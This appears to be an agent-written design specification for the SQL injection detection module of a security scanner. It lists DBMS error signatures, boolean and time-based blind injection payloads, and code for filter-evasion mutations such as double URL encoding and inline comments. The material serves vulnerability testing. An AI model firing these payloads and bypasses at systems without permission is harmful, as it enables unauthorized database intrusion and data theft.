# Technical Specification & Architectural Blueprint: Database Query Safety Validation Collector (Sprint 9)

**Author:** Query Safety Spec Miner (`survey_miner_2`)  
**Target Module:** `argus.collectors.sql_injection`  
**Standard Reference:** OWASP WSTG-INPV-05 (Testing for SQL Injection), OWASP Top 10 A03:2021 (Injection)  
**Integrity Mode:** Benchmark / Zero-Regression  
**Status:** Completed Technical Specification  

---

## 1. Observation

### 1.1 Codebase Survey & Architectural Baseline
Direct inspection of the ARGUS repository (`/home/varun/argus`) reveals the established collector patterns, models, graph topology, and execution lifecycle:

1. **Collector Architecture Pattern (`argus/collectors/`)**:
   - Existing collectors (`path_traversal.py`, `access_control.py`, `information_disclosure.py`) follow a three-tier modular pattern:
     - **Payload Generator (`*PayloadGenerator`)**: Generates base injection payloads and applies transformation / encoding mutations.
     - **Analyzer (`*Analyzer`)**: Evaluates HTTP responses, executes signature matching, differential heuristics, and false positive suppression.
     - **Collector (`*Collector(BaseCollector)`)**: Orchestrates candidate parameter extraction, executes network requests via `AuthenticatedHttpClient`, generates `Evidence`, updates `mission.vulnerabilities`, and connects `KnowledgeGraph` nodes and edges.
2. **Mission Interface Compatibility**:
   - `ControlledMission` (`argus/plugins/interfaces.py`) wraps the raw `Mission` object and exposes only properties like `.target` and `.evidence`.
   - Collectors must safely unwrap the underlying mission via `raw_mission = getattr(mission, "_mission", mission)` to access `.endpoints`, `.live_hosts`, `.attack_surface_graph`, and `.vulnerabilities`.
3. **Evidence & Attack Surface Graph Model**:
   - `Evidence` (`argus/evidence/model.py`): Requires `category="sql_injection"`, `severity="critical" | "high"`, `confidence=0.90..0.95`, `status="CONFIRMED"`, `provenance=ProvenanceData(step_id="sql_injection_collector")`.
   - `KnowledgeGraph` (`argus/graph/graph.py`): Connects `live_host` -> `endpoint` via `HAS_ENDPOINT`, and connects both `live_host` -> `vulnerability` and `endpoint` -> `vulnerability` via `HAS_VULNERABILITY`.
4. **Planning DAG & Runtime Integration**:
   - `TaskGenerator` (`argus/planning/task_generator.py`): Reconnaissance templates in `_RECON_TEMPLATES` define task title `"Fuzz SQL Injection"`, category `TaskCategory.EVIDENCE_CORRELATION`, and dependency `["Discover API Endpoints"]`.
   - `ToolRegistry` (`argus/runtime/registry.py`): Global `registry.register(Tool(id="sql_injection", name="SQL Injection Detector", capability="sql_injection_detector", ...))`.
   - `PluginExecutorAdapter` (`argus/runtime/plugins.py`): Implements `_instantiate_specialist_fallback("sql_injection") -> SQLInjectionCollector()`.

### 1.2 Test Suite Baseline & Verification Audit
- **Baseline Test Suite Status**:
  - Existing suite contains 861 passing tests (`pytest tests/ --ignore=tests/workspace -x -q`).
  - Sprint 9 requires zero regressions across all 861 existing tests and $\ge 20$ newly added comprehensive unit, adversarial, and E2E integration tests.
- **Specific Implementation Caveats Observed**:
  - In `SQLInjectionAnalyzer.is_false_positive(response, payload)`: Pure reflection of benign payloads (without DBMS errors or generic error words) must explicitly evaluate to `is_false_positive=True` if no genuine DBMS error signature is detected outside the reflected span.
  - In `SQLInjectionCollector.execute(mission)`: Must support `ControlledMission` wrapping transparently by unwrapping `raw_mission = getattr(mission, "_mission", mission)`.

---

## 2. Technical Specification

### 2.1 Section 1: Syntax Error Diagnostic Signatures & False Positive Suppression

#### 2.1.1 Multi-DBMS Diagnostic Error Signature Catalog
Relational database management systems (RDBMS) return structured, engine-specific diagnostic error messages when executing queries with unescaped syntax errors. The collector must compile and evaluate against the following regex patterns compiled with `re.IGNORECASE` and `re.MULTILINE` where applicable:

```python
DBMS_ERROR_SIGNATURES: Dict[str, List[Tuple[str, re.Pattern]]] = {
    "mysql": [
        ("mysql_syntax_error", re.compile(r"You have an error in your SQL syntax", re.IGNORECASE)),
        ("mysql_version_manual", re.compile(r"check the manual that corresponds to your (?:MySQL|MariaDB) server version", re.IGNORECASE)),
        ("mysql_client_error", re.compile(r"\bMySqlClient\.", re.IGNORECASE)),
        ("mysql_jdbc_error", re.compile(r"com\.mysql\.jdbc\.exceptions", re.IGNORECASE)),
        ("mysql_syntax_exception", re.compile(r"\bMySQLSyntaxErrorException\b", re.IGNORECASE)),
        ("mysql_valid_result", re.compile(r"valid MySQL result", re.IGNORECASE)),
        ("mysql_unknown_column", re.compile(r"Unknown column '[^']+' in '(?:where clause|field list|order clause|having clause)'", re.IGNORECASE)),
        ("mysql_table_not_found", re.compile(r"Table '[^']+' doesn't exist", re.IGNORECASE)),
        ("mysql_fetch_warning", re.compile(r"(?:mysql|mysqli|pdo_mysql)_(?:fetch_|query|select_db)", re.IGNORECASE)),
    ],
    "postgresql": [
        ("postgres_error", re.compile(r"PostgreSQL.*ERROR", re.IGNORECASE)),
        ("postgres_query_failed", re.compile(r"pg_query\(\): Query failed:", re.IGNORECASE)),
        ("postgres_exec_failed", re.compile(r"pg_exec\(\): Query failed:", re.IGNORECASE)),
        ("postgres_psql_exception", re.compile(r"org\.postgresql\.util\.PSQLException", re.IGNORECASE)),
        ("postgres_psql_exception_short", re.compile(r"\bPSQLException\b", re.IGNORECASE)),
        ("postgres_syntax_near", re.compile(r"ERROR:\s+syntax error at or near", re.IGNORECASE)),
        ("postgres_column_missing", re.compile(r"ERROR:\s+column \"[^\"]+\" does not exist", re.IGNORECASE)),
        ("postgres_relation_missing", re.compile(r"ERROR:\s+relation \"[^\"]+\" does not exist", re.IGNORECASE)),
        ("postgres_aborted_transaction", re.compile(r"current transaction is aborted, commands ignored until end of transaction block", re.IGNORECASE)),
        ("postgres_unterminated_quote", re.compile(r"unterminated quoted string at or near", re.IGNORECASE)),
    ],
    "oracle": [
        ("oracle_ora_code", re.compile(r"\bORA-[0-9]{5}\b")),
        ("oracle_error_tag", re.compile(r"Oracle error", re.IGNORECASE)),
        ("oracle_driver_error", re.compile(r"Oracle.*Driver", re.IGNORECASE)),
        ("oracle_quoted_string", re.compile(r"quoted string not properly terminated", re.IGNORECASE)),
        ("oracle_command_not_ended", re.compile(r"SQL command not properly ended", re.IGNORECASE)),
        ("oracle_pls_code", re.compile(r"\bPLS-[0-9]{5}\b")),
        ("oracle_jdbc_error", re.compile(r"oracle\.jdbc\.driver", re.IGNORECASE)),
        ("oracle_missing_expression", re.compile(r"ORA-00936: missing expression", re.IGNORECASE)),
    ],
    "sqlite": [
        ("sqlite_jdbc_driver", re.compile(r"SQLite/JDBCDriver", re.IGNORECASE)),
        ("sqlite_exception", re.compile(r"SQLite\.Exception", re.IGNORECASE)),
        ("sqlite_operational_error", re.compile(r"sqlite3\.OperationalError", re.IGNORECASE)),
        ("sqlite_error_tag", re.compile(r"\bSQLITE_ERROR\b")),
        ("sqlite_syntax_near", re.compile(r"near \"[^\"]*\": syntax error", re.IGNORECASE)),
        ("sqlite_unrecognized_token", re.compile(r"unrecognized token:", re.IGNORECASE)),
        ("sqlite_incomplete_input", re.compile(r"incomplete input", re.IGNORECASE)),
        ("sqlite_syntax_error_raw", re.compile(r"System\.Data\.SQLite\.SQLiteException", re.IGNORECASE)),
    ],
    "mssql": [
        ("mssql_driver_error", re.compile(r"Driver.*SQL[-_ ]Server", re.IGNORECASE)),
        ("mssql_oledb_error", re.compile(r"OLE DB.*SQL Server", re.IGNORECASE)),
        ("mssql_jdbc_driver", re.compile(r"\bSQLServer JDBC Driver\b", re.IGNORECASE)),
        ("mssql_unclosed_quote", re.compile(r"Unclosed quotation mark (?:after|before) the character string", re.IGNORECASE)),
        ("mssql_odbc_driver", re.compile(r"\[Microsoft\]\[ODBC SQL Server Driver\]", re.IGNORECASE)),
        ("mssql_server_tag", re.compile(r"\[SQL Server\]", re.IGNORECASE)),
        ("mssql_syntax_near", re.compile(r"Incorrect syntax near", re.IGNORECASE)),
        ("mssql_conversion_failed", re.compile(r"Conversion failed when converting the varchar value", re.IGNORECASE)),
    ],
}
```

#### 2.1.2 False Positive Suppression Rules
To ensure zero false positives against standard application pages, custom 404/500 error templates, and search echo pages, the analyzer enforces 5 strict suppression filters:

1. **Strict Engine Signature Matching**:
   - Generic terms such as `"error"`, `"syntax"`, `"database"`, `"query"`, or `"sql"` occurring without a matching pattern from `DBMS_ERROR_SIGNATURES` are discarded as normal application text.
2. **Baseline Differential Error Rejection**:
   - Before fuzzing, the collector executes a benign baseline request ($Req_{base}$).
   - If the baseline response ($Resp_{base}$) already contains the matching DBMS error regex pattern (e.g. an unhandled exception in an unconfigured backend module), the error is classified as pre-existing and suppressed.
3. **Payload Reflection Discard**:
   - When a test input string (e.g. `' OR 1=1--`) is echoed in the response HTML/JSON body (e.g. `<p>Results for: ' OR 1=1--</p>`), the analyzer verifies whether the matched error signature span falls strictly within the reflected input span.
   - If no valid DBMS error pattern exists outside the reflected payload offsets, or if no DBMS signature is present, the finding is suppressed.
4. **HTML Error Title & Generic Exception Suppression**:
   - HTTP responses with `<title>Application Error</title>`, `<title>500 Internal Server Error</title>`, or generic validation summaries (e.g. `"Please contact sql-admin@company.com"`) that do not contain an unescaped database driver or engine syntax trace are suppressed.
5. **Minimum Viable Payload & Response Length**:
   - Empty or near-empty response bodies ($< 5$ bytes) and empty injected payloads are automatically discarded.

---

### 2.2 Section 2: Boolean Differential Analysis

#### 2.2.1 Parameter-Type Aware Tautology & Contradiction Pair Generation
Boolean-based blind validation evaluates whether an application's database query output responds differentially to injected truth conditions vs false conditions:

```
Tautology Condition (TRUE):      Param = <original> OR 1=1
Contradiction Condition (FALSE):  Param = <original> OR 1=2
```

The payload generator produces pairs tailored to numeric, string, and grouped parameter contexts:

| Parameter Context | Tautology Payload (TRUE) | Contradiction Payload (FALSE) | Termination / Comments |
|---|---|---|---|
| **Numeric Parameter** | `1 AND 1=1` | `1 AND 1=2` | Inline / No comment |
| **Numeric Parameter** | `1 AND 1=1--` | `1 AND 1=2--` | Standard SQL comment (`--`) |
| **Numeric Parameter** | `1 OR 1=1#` | `1 OR 1=2#` | MySQL comment hash (`#`) |
| **String Parameter (Single Quote)** | `' OR '1'='1` | `' OR '1'='2` | Quoted string balance |
| **String Parameter (Single Quote)** | `' OR 'a'='a` | `' OR 'a'='b` | Alphabetic quote balance |
| **String Parameter (Single Quote)** | `' OR 1=1--` | `' OR 1=2--` | Comment terminated |
| **String Parameter (Double Quote)** | `" OR "1"="1` | `" OR "1"="2` | Double quoted string balance |
| **String Parameter (Double Quote)** | `" OR 1=1--` | `" OR 1=2--` | Double quote with comment |
| **Grouped / Parenthesized** | `') OR ('1'='1` | `') OR ('1'='2` | Parenthesis balance |
| **Grouped / Parenthesized** | `") OR ("1"="1` | `") OR ("1"="2` | Double quote grouped |
| **Block Comment** | `' OR 1=1/*` | `' OR 1=2/*` | Block comment balance |

#### 2.2.2 Differential Response Comparison Algorithms

```
                       +-------------------------+
                       | Injected TRUE / FALSE   |
                       | HTTP Responses Received |
                       +------------+------------+
                                    |
                    +---------------+---------------+
                    |                               |
          [Status Code Check]             [Body Content Check]
                    |                               |
          Status(T) != Status(F)?           Len(T) vs Len(F)
          True == 200 & False in 4xx/5xx?   Delta >= 25 bytes?
                    |                               |
             +------+------+                 +------+------+
             | YES         | NO              | YES         | NO
             v             v                 v             v
       [CONFIRM SQLi] [Next Check]    [Baseline Delta]  [Check Hashes]
                                             |                 |
                                      |Len(T)-Len(Base)| <   Hash(T) == Hash(Base)
                                      |Len(F)-Len(Base)|?    Hash(F) != Hash(Base)?
                                             |                 |
                                      +------+------+   +------+------+
                                      | YES         |   | YES         |
                                      v             v   v             v
                                [CONFIRM SQLi] [REJECT / NOISE]
```

##### 1. Status Code Differential Algorithm
- If $Status(Resp_{TRUE}) == 200$ (or matches $Status(Resp_{baseline})$) AND $Status(Resp_{FALSE}) \in \{400, 404, 500, 403, 302, 422\}$:
  - Confirms boolean differential state change with severity `"high"`, confidence $0.90$.

##### 2. Content Length Delta Algorithm ($\Delta L$)
- Let $L_T = \text{len}(Resp_{TRUE}.\text{raw\_body})$, $L_F = \text{len}(Resp_{FALSE}.\text{raw\_body})$, and $L_{base} = \text{len}(Resp_{baseline}.\text{raw\_body})$.
- Content length differential: $\Delta L = |L_T - L_F|$.
- Minimum threshold rule: $\Delta L \ge 25\text{ bytes}$ (or relative delta $\frac{|L_T - L_F|}{\max(L_T, L_F)} \ge 0.10$).
- Baseline Stability Heuristic:
  - $|L_T - L_{base}| < |L_F - L_{base}|$ AND $|L_F - L_{base}| \ge 25\text{ bytes}$.
  - This guarantees that TRUE preserves normal baseline content rendering, while FALSE collapses or alters page structure.

##### 3. Dynamic Token Sanitization & Content Hashing (MD5 / SHA256)
To prevent dynamic elements (CSRF tokens, timestamps, nonces) from disrupting hash equivalence:
- Preprocessing Filter: Strip dynamic patterns before hashing:
  ```python
  def sanitize_body_for_hashing(body: str) -> str:
      # Strip ISO timestamps, UUIDs, hex tokens, and CSRF input values
      body = re.sub(r"\b\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}(?:\.\d+)?Z?\b", "", body)
      body = re.sub(r"\b[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}\b", "", body)
      body = re.sub(r'name=["\'](?:csrf|token|_token|nonce)["\']\s+value=["\'][^"\']+["\']', "", body)
      return body
  ```
- Deterministic Hash Verification:
  - If $\text{SHA256}(Body_{TRUE\_clean}) == \text{SHA256}(Body_{BASE\_clean})$ AND $\text{SHA256}(Body_{FALSE\_clean}) \ne \text{SHA256}(Body_{BASE\_clean})$:
  - High confidence confirmation ($0.95$).

##### 4. Similarity Ratio Calculation
- Using sequence matching: $Sim(A, B) = \text{difflib.SequenceMatcher}(\text{None}, A, B).\text{ratio}()$.
- If $Sim(Body_{TRUE}, Body_{baseline}) \ge 0.95$ AND $Sim(Body_{FALSE}, Body_{baseline}) \le 0.85$, confirm boolean differential vulnerability.

---

### 2.3 Section 3: Latency Differential Measurement (Time-Based Blind SQLi)

#### 2.3.1 Measurement Model & Baseline Latency Calibration
Time-based blind SQL injection relies on injecting commands that instruct the database engine to sleep for a designated duration $D$ (seconds). Latency measurements are subject to network jitter, server load, and proxy delays. The measurement algorithm isolates genuine database delays via baseline calibration:

```
                      +-----------------------------+
                      | 1. Measure Baseline Latency |
                      |    T_base = time(Req_base)  |
                      +--------------+--------------+
                                     |
                      +--------------+--------------+
                      | 2. Inject Sleep Payload     |
                      |    (e.g. D = 5.0 seconds)   |
                      |    T_inj = time(Req_sleep)  |
                      +--------------+--------------+
                                     |
                      +--------------+--------------+
                      | 3. Calculate Differential   |
                      |    Delta_T = T_inj - T_base |
                      +--------------+--------------+
                                     |
                                     v
                        Is Delta_T >= 4.0 seconds
                         AND T_inj >= 4.0 seconds?
                                    / \
                                   /   \
                             YES  /     \  NO
                                 /       \
                                v         v
                         [CONFIRM SQLi] [REJECT]
                        Severity: Critical
```

#### 2.3.2 Time-Delay Payloads Catalog

```python
DEFAULT_TIME_PAYLOADS_TEMPLATE: List[str] = [
    # MySQL / MariaDB
    "' OR SLEEP({delay})--",
    "1' OR SLEEP({delay})--",
    "'; SELECT SLEEP({delay});--",
    "1' AND (SELECT 1 FROM (SELECT(SLEEP({delay})))a)--",
    # PostgreSQL
    "'; SELECT pg_sleep({delay});--",
    "1' AND (SELECT 1 FROM (SELECT(pg_sleep({delay})))a)--",
    "' OR pg_sleep({delay})--",
    # Microsoft SQL Server (MSSQL)
    "'; WAITFOR DELAY '0:0:{delay}'--",
    "1'; WAITFOR DELAY '0:0:{delay}'--",
    "' WAITFOR DELAY '0:0:{delay}'--",
    # Oracle Database
    "1' AND 1=dbms_pipe.receive_message('RDS', {delay})--",
    "1' AND 1=dbms_lock.sleep({delay})--",
    # SQLite (Heavy CPU computation emulation)
    "1' AND (SELECT 1 FROM (SELECT(LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({delay}0000000/2)))))))--",
]
```

#### 2.3.3 Algorithmic Verification & Noise Elimination Logic
1. **Baseline Measurement**:
   - $T_{base} = \text{HttpResponse.elapsed}$ (or `time.time() - t0` wall-clock delta).
   - Set client HTTP socket timeout to $\max(10.0, T_{base} + D + 4.0)$ seconds.
2. **Injected Request Measurement**:
   - Send payload with $D = 5.0\text{ seconds}$.
   - $T_{injected} = \text{HttpResponse.elapsed}$.
   - $\Delta T = T_{injected} - T_{base}$.
3. **Decision Criteria**:
   - **Acceptance Condition**: $\Delta T \ge 4.0\text{ seconds}$ AND $T_{injected} \ge 4.0\text{ seconds}$.
   - Severity: `"critical"`, Confidence: $0.95$, Template ID: `"sqli-time-blind"`.
4. **Rejection of Server Latency Congestion**:
   - If $T_{base} = 4.5\text{s}$ (server already congested) and $T_{injected} = 4.7\text{s}$, $\Delta T = 0.2\text{s} < 4.0\text{s} \implies$ **REJECT**.

---

### 2.4 Section 4: Input Mutation & Encoding Engine

To evaluate target filter resilience and bypass Web Application Firewall (WAF) rule sets, the mutation engine implements 5 distinct transformation strategies:

```
                            +--------------------+
                            | Base SQL Injection |
                            |      Payload       |
                            +---------+----------+
                                      |
         +-------------+-------------+-------------+-------------+
         |             |             |             |             |
         v             v             v             v             v
    [Strategy 1]  [Strategy 2]  [Strategy 3]  [Strategy 4]  [Strategy 5]
    Case          Inline        URL Percent   Double URL    Whitespace
    Alternation   Comments      Encoding      Encoding      Substitution
    (sElEcT)      (SEL/**/ECT)  (%27%20OR)    (%2527%2520)  (%09, +)
```

#### 2.4.1 Strategy 1: Case Alternation
- **Mechanism**: Modifies keyword characters into alternating upper and lower case to bypass case-sensitive substring matching filters.
- **Implementation**:
  ```python
  SQL_KEYWORDS_PATTERN = re.compile(
      r"\b(SELECT|UNION|WHERE|AND|OR|SLEEP|WAITFOR|DELAY|CONVERT|CAST|FROM|ORDER|BY|HAVING|GROUP|LIMIT|EXEC|EXECUTE|DBMS_PIPE|RECEIVE_MESSAGE|DBMS_LOCK|PG_SLEEP|NULL|VERSION|BANNER|ROWNUM|COUNT|VARCHAR)\b",
      re.IGNORECASE,
  )

  def mutate_case_alternation(self, payload: str) -> str:
      def _alternate(match: re.Match) -> str:
          word = match.group(0)
          return "".join(c.lower() if i % 2 == 0 else c.upper() for i, c in enumerate(word))
      return self.SQL_KEYWORDS_PATTERN.sub(_alternate, payload)
  ```
- **Example**: `' UNION SELECT id FROM users--` $\longrightarrow$ `' uNiOn sElEcT id fRoM users--`

#### 2.4.2 Strategy 2: Inline Comment Delimiter Insertion
- **Mechanism**: Inserts SQL comment tokens `/**/` inside keywords or between clauses. SQL lexers discard comments while signature filters fail to match the broken keyword.
- **Implementation**:
  ```python
  def mutate_comment_insertion(self, payload: str) -> str:
      def _comment_inside(match: re.Match) -> str:
          word = match.group(0)
          if len(word) > 2:
              mid = len(word) // 2
              return f"{word[:mid]}/**/{word[mid:]}"
          return word
      return self.SQL_KEYWORDS_PATTERN.sub(_comment_inside, payload)
  ```
- **Example**: `' UNION SELECT 1,2--` $\longrightarrow$ `' UN/**/ION SEL/**/ECT 1,2--`

#### 2.4.3 Strategy 3: Character Encoding Variations (Standard URL Percent-Encoding)
- **Mechanism**: Replaces all non-alphanumeric special characters with standard `%HEX` ASCII representations (`urllib.parse.quote(payload, safe="")`).
- **Example**: `' OR 1=1--` $\longrightarrow$ `%27%20OR%201%3D1--`

#### 2.4.4 Strategy 4: Double URL Percent-Encoding
- **Mechanism**: Encodes the percent character `%` into `%25` on top of an already percent-encoded string.
- **Application**: Reverse proxies / WAFs decode once (`%2527` $\rightarrow$ `%27`), inspect the harmless `%27` text without triggering alerts, and forward to the backend web application which performs a second decoding step (`%27` $\rightarrow$ `'`).
- **Implementation**:
  ```python
  def mutate_double_url_encoding(self, payload: str) -> str:
      first_pass = urllib.parse.quote(payload, safe="")
      return urllib.parse.quote(first_pass, safe="")
  ```
- **Example**: `' OR 1=1--` $\longrightarrow$ `%2527%2520OR%25201%253D1--`

#### 2.4.5 Strategy 5: Whitespace Substitution
- **Mechanism**: Substitutes standard ASCII spaces (`0x20`) with valid SQL separator characters:
  - Horizontal Tab: `%09`
  - Line Feed: `%0a`
  - Carriage Return: `%0d`
  - Plus sign: `+`
  - Inline block comment: `/**/`
- **Implementation**:
  ```python
  def mutate_whitespace_substitution(self, payload: str) -> str:
      if " " in payload:
          return payload.replace(" ", "%09")
      return payload
  ```
- **Example**: `' UNION SELECT 1--` $\longrightarrow$ `'%09UNION%09SELECT%091--` or `'/**/UNION/**/SELECT/**/1--`

---

### 2.5 Section 5: Request Parameter Target Extraction

The collector comprehensively extracts and fuzzes 4 primary injection vectors:

```
+--------------------------------------------------------------------------------+
|                         REQUEST PARAMETER TARGET EXTRACTION                    |
+--------------------------------------------------------------------------------+
|  1. URL Query Parameters     -> /api/search?q={PAYLOAD}&category=books        |
|  2. POST Body Formats        -> JSON: {"username": "{PAYLOAD}", "role": 1}     |
|                                 Form-Urlencoded: user={PAYLOAD}&pass=123       |
|                                 Multipart: name="file"; filename="{PAYLOAD}"   |
|  3. Path REST Segments       -> /api/v1/users/{ID+PAYLOAD}/profile             |
|  4. HTTP Request Headers     -> Cookie: session_id={PAYLOAD}                   |
|                                 X-Forwarded-For: 127.0.0.1'{PAYLOAD}           |
|                                 Referer: https://target.local/{PAYLOAD}        |
+--------------------------------------------------------------------------------+
```

#### 2.5.1 Vector 1: URL Query Parameters
- **Extraction**: Parsed using `urllib.parse.urlparse` and `urllib.parse.parse_qs(parsed.query, keep_blank_values=True)`.
- **Targeting**: Iterates over each parameter key independently, substitutes candidate payload, re-encodes query string via `urllib.parse.urlencode(mutated_params, doseq=True)`, and dispatches `GET` request.

#### 2.5.2 Vector 2: POST Body Formats (JSON, Form-Urlencoded, Multipart)
- **JSON Bodies (`application/json`)**:
  - Parsed via `json.loads` or ingested as dictionary.
  - Recursively traverses JSON structures to inject payloads into leaf string and integer fields:
    ```python
    def inject_json_fields(data: Any, payload: str) -> List[Any]:
        variants = []
        if isinstance(data, dict):
            for k, v in data.items():
                mutated = dict(data)
                if isinstance(v, (str, int, float)):
                    mutated[k] = payload if isinstance(v, str) else f"{v}{payload}"
                    variants.append((k, mutated))
        return variants
    ```
- **Form-Urlencoded (`application/x-www-form-urlencoded`)**:
  - Evaluates key-value dictionary `post_fields`. Injects payloads per key and submits via `data=mutated_body`.
- **Multipart Form-Data (`multipart/form-data`)**:
  - Injects into form-data field values and file upload parameters (`filename="test'.jpg"`).

#### 2.5.3 Vector 3: RESTful Path Segments
- **Extraction**: Parses URL path into segments: `segments = [s for s in parsed.path.strip("/").split("/") if s]`.
- **Targeting**: Filters for dynamic resource identifiers:
  - Numeric IDs: `segment.isdigit()`
  - UUIDs / Hex Hashes / Slugs: `len(segment) > 15` or regex `^[0-9a-fA-F-]{32,36}$`.
- **Mutation**: Mutates target segment `mutated_segments[idx] = f"{segment}{payload}"` and reconstructs URL path.

#### 2.5.4 Vector 4: HTTP Request Headers
- Evaluates headers commonly referenced in server-side authentication, logging, and access control SQL queries:
  1. `Cookie`: `session_id={payload}; token=abc`
  2. `Referer`: `{base_url}/{payload}`
  3. `X-Forwarded-For`: `127.0.0.1'{payload}`
  4. `User-Agent`: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) {payload}`

---

### 2.6 Section 6: Pipeline DAG Wiring & Attack Surface Graph Expansion

#### 2.6.1 TaskGenerator DAG Wiring (`argus/planning/task_generator.py`)
- **Template Definition**:
  ```python
  "sql_injection": {
      "title": "Fuzz SQL Injection",
      "tool_id": "sql_injection",
      "category": TaskCategory.EVIDENCE_CORRELATION,
      "priority": 0.82,
      "timeout": 120,
      "dependencies": ["Discover API Endpoints"],
      "description": "Fuzz discovered endpoints for database query injection vulnerabilities",
  }
  ```
- **Gap Resolution**: Map keywords `{"sql_injection", "sqli", "sql injection", "database injection"}` to the `sql_injection` template.

#### 2.6.2 Tool Registry & Specialist Adapter
- **`registry.py`**:
  ```python
  registry.register(
      Tool(
          id="sql_injection",
          name="SQL Injection Detector",
          description="Autonomous SQL Injection Detection Collector",
          capabilities=["sql_injection_detector"],
          safety_requirements={"type": "internal", "permissions": ["network", "db_read", "db_write"]},
      )
  )
  ```
- **`plugins.py`**:
  ```python
  if plugin_id == "sql_injection":
      from argus.collectors.sql_injection import SQLInjectionCollector
      return SQLInjectionCollector()
  ```

#### 2.6.3 KnowledgeGraph Node & Edge Expansion
- For each confirmed SQL injection vulnerability:
  - Create `live_host` node: `id=f"live_host:{base_url}"`
  - Create `endpoint` node: `id=f"endpoint:{target_url}"`
  - Create `vulnerability` node: `id=f"vulnerability:{template_id}:{target_url}:{param}"`
  - Connect edges:
    - `graph.connect(lh_id, ep_id, edge_type="HAS_ENDPOINT")`
    - `graph.connect(lh_id, vuln_id, edge_type="HAS_VULNERABILITY")`
    - `graph.connect(ep_id, vuln_id, edge_type="HAS_VULNERABILITY")`

---

## 3. Logic Chain

1. **Premise 1 (OWASP Standard Conformance)**:
   - Defending and auditing database query safety requires testing error-based, boolean-blind, and time-blind channels.
   - Compiling exact engine signatures for MySQL, PostgreSQL, Oracle, SQLite, and MSSQL provides deterministic detection of unhandled query exceptions.
2. **Premise 2 (False Positive Suppression Necessity)**:
   - Naive string matching triggers false positives on generic application error pages and reflected user inputs.
   - Enforcing baseline differential checks and reflection span discard ensures only authentic backend database executions produce findings.
3. **Premise 3 (Differential Robustness)**:
   - Dynamic pages introduce CSRF and timestamp noise.
   - Preprocessing bodies to strip transient tokens prior to hashing, combined with length delta thresholds ($\ge 25$ bytes) and status code differentials, guarantees reliable boolean blind discovery.
4. **Premise 4 (WAF Resilience)**:
   - Perimeter input filters frequently block raw SQL keywords.
   - Providing 5 distinct mutation strategies (case alternation, comment insertion, standard URL encoding, double URL encoding, whitespace substitution) verifies filter bypass resilience.
5. **Premise 5 (Mission & Graph Cohesion)**:
   - Emitting `Evidence(category="sql_injection")`, updating `mission.vulnerabilities`, and expanding `KnowledgeGraph` with `HAS_VULNERABILITY` edges aligns with ARGUS's autonomous reasoning and reporting pipeline.

---

## 4. Caveats

- **ControlledMission Wrapping**: The collector must always unwrap `raw_mission = getattr(mission, "_mission", mission)` to ensure access to endpoints and graph instances when invoked via plugin adapters.
- **Reflection Discard Implementation**: In `SQLInjectionAnalyzer.is_false_positive`, if no DBMS error signature matched and the response is a pure search echo without database syntax execution, it must return `True` (indicating a false positive).
- **Time Delay Jitter**: Testing on heavily loaded or high-latency networks may introduce jitter. Requiring both $\Delta T \ge 4.0\text{s}$ and $T_{injected} \ge 4.0\text{s}$ guards against baseline latency misattribution.

---

## 5. Conclusion

The technical implementation specification for Sprint 9 Database Query Safety Validation Collector is fully articulated across all 5 required domains:
1. **Syntax Error Diagnostic Signatures**: Comprehensive multi-DBMS regex catalog (MySQL, PostgreSQL, Oracle, SQLite, MSSQL) and 5 false positive suppression filters.
2. **Boolean Differential Analysis**: Context-aware TRUE/FALSE pair generation, length delta thresholds ($\ge 25$ bytes), status code differential, dynamic token stripping, and SHA256 content hashing.
3. **Latency Differential Measurement**: Baseline latency calibration requiring $\Delta T \ge 4.0\text{s}$ delay above baseline.
4. **Input Mutation Engine**: 5 distinct WAF bypass strategies (case alternation, inline comments, URL encoding, double encoding, whitespace substitution).
5. **Request Parameter Extraction**: Complete coverage for GET query params, POST JSON / form-urlencoded / multipart bodies, REST path segments, and HTTP headers.

---

## 6. Verification Method

To verify the implementation independently against the test suite:

1. **Full Test Suite Execution**:
   ```bash
   python -m pytest tests/ --ignore=tests/workspace -x -q
   ```
   *Expected Output*: Exit Code 0, $\ge 880$ passing tests (861 baseline + $\ge 20$ new tests), 0 regressions.

2. **Collector Unit Tests**:
   ```bash
   python -m pytest tests/collectors/test_sql_injection.py -v
   ```
   *Validates*: Error signatures, boolean differential analysis, timing delay, false positive rejection, parameter targeting, DAG wiring, and graph builder reconstruction.

3. **Adversarial & Boundary Tests**:
   ```bash
   python -m pytest tests/collectors/test_sql_injection_adversarial.py -v
   ```
   *Validates*: Malformed URLs, pre-existing database errors, CSRF token noise, HTTP timeouts, nested JSON, and WAF mutation strategies.

4. **End-to-End Mission Loop Tests**:
   ```bash
   python -m pytest tests/runtime/test_e2e_sql_injection.py -v
   ```
   *Validates*: Autonomous mission execution, TaskGenerator scheduling, PluginExecutorAdapter dispatch, Evidence generation, and AttackSurfaceGraphBuilder reconstruction.
